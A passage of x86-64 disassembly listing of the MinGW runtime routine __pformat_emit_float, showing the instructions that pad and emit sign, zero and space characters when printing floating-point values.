   140004cce:	5f                   	pop    %rdi
   140004ccf:	5d                   	pop    %rbp
   140004cd0:	c3                   	ret
   140004cd1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004cd8:	85 c0                	test   %eax,%eax
   140004cda:	0f 8e 40 01 00 00    	jle    140004e20 <__pformat_emit_float+0x340>
   140004ce0:	41 8b 51 10          	mov    0x10(%r9),%edx
   140004ce4:	83 e8 01             	sub    $0x1,%eax
   140004ce7:	39 d0                	cmp    %edx,%eax
   140004ce9:	0f 8e 3f 01 00 00    	jle    140004e2e <__pformat_emit_float+0x34e>
   140004cef:	29 d0                	sub    %edx,%eax
   140004cf1:	85 d2                	test   %edx,%edx
   140004cf3:	0f 8e 87 01 00 00    	jle    140004e80 <__pformat_emit_float+0x3a0>
   140004cf9:	83 e8 01             	sub    $0x1,%eax
   140004cfc:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140004d00:	85 c0                	test   %eax,%eax
   140004d02:	0f 8e 78 fe ff ff    	jle    140004b80 <__pformat_emit_float+0xa0>
   140004d08:	85 ed                	test   %ebp,%ebp
   140004d0a:	0f 85 30 01 00 00    	jne    140004e40 <__pformat_emit_float+0x360>
   140004d10:	8b 53 08             	mov    0x8(%rbx),%edx
   140004d13:	f7 c2 c0 01 00 00    	test   $0x1c0,%edx
   140004d19:	0f 85 41 01 00 00    	jne    140004e60 <__pformat_emit_float+0x380>
   140004d1f:	80 e6 06             	and    $0x6,%dh
   140004d22:	0f 85 88 fe ff ff    	jne    140004bb0 <__pformat_emit_float+0xd0>
   140004d28:	83 e8 01             	sub    $0x1,%eax
   140004d2b:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004d2e:	66 90                	xchg   %ax,%ax
   140004d30:	48 89 da             	mov    %rbx,%rdx
   140004d33:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004d38:	e8 73 ee ff ff       	call   140003bb0 <__pformat_putc>
   140004d3d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140004d40:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004d43:	89 53 0c             	mov    %edx,0xc(%rbx)
   140004d46:	85 c0                	test   %eax,%eax
   140004d48:	7f e6                	jg     140004d30 <__pformat_emit_float+0x250>
   140004d4a:	85 ed                	test   %ebp,%ebp
   140004d4c:	0f 84 36 fe ff ff    	je     140004b88 <__pformat_emit_float+0xa8>
   140004d52:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d58:	48 89 da             	mov    %rbx,%rdx
   140004d5b:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140004d60:	e8 4b ee ff ff       	call   140003bb0 <__pformat_putc>
   140004d65:	e9 46 fe ff ff       	jmp    140004bb0 <__pformat_emit_float+0xd0>
   140004d6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d70:	48 89 da             	mov    %rbx,%rdx
   140004d73:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004d78:	e8 33 ee ff ff       	call   140003bb0 <__pformat_putc>
   140004d7d:	8b 43 10             	mov    0x10(%rbx),%eax
   140004d80:	85 c0                	test   %eax,%eax
   140004d82:	0f 8f 40 01 00 00    	jg     140004ec8 <__pformat_emit_float+0x3e8>
   140004d88:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   140004d8c:	0f 85 36 01 00 00    	jne    140004ec8 <__pformat_emit_float+0x3e8>
   140004d92:	85 f6                	test   %esi,%esi
   140004d94:	0f 84 e3 fe ff ff    	je     140004c7d <__pformat_emit_float+0x19d>
   140004d9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004da0:	01 f0                	add    %esi,%eax
   140004da2:	89 43 10             	mov    %eax,0x10(%rbx)
   140004da5:	0f 1f 00             	nopl   (%rax)
   140004da8:	48 89 da             	mov    %rbx,%rdx
   140004dab:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004db0:	e8 fb ed ff ff       	call   140003bb0 <__pformat_putc>
   140004db5:	83 c6 01             	add    $0x1,%esi
   140004db8:	75 ee                	jne    140004da8 <__pformat_emit_float+0x2c8>
   140004dba:	e9 fc fe ff ff       	jmp    140004cbb <__pformat_emit_float+0x1db>
   140004dbf:	90                   	nop
   140004dc0:	48 89 da             	mov    %rbx,%rdx
   140004dc3:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   140004dc8:	e8 e3 ed ff ff       	call   140003bb0 <__pformat_putc>
   140004dcd:	e9 de fd ff ff       	jmp    140004bb0 <__pformat_emit_float+0xd0>
   140004dd2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004dd8:	83 e8 01             	sub    $0x1,%eax
   140004ddb:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004dde:	66 90                	xchg   %ax,%ax
   140004de0:	48 89 da             	mov    %rbx,%rdx
   140004de3:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004de8:	e8 c3 ed ff ff       	call   140003bb0 <__pformat_putc>
   140004ded:	8b 43 0c             	mov    0xc(%rbx),%eax
   140004df0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004df3:	89 53 0c             	mov    %edx,0xc(%rbx)
   140004df6:	85 c0                	test   %eax,%eax
   140004df8:	7f e6                	jg     140004de0 <__pformat_emit_float+0x300>
   140004dfa:	e9 cd fd ff ff       	jmp    140004bcc <__pformat_emit_float+0xec>
   140004dff:	90                   	nop
   140004e00:	29 d0                	sub    %edx,%eax
   140004e02:	85 d2                	test   %edx,%edx
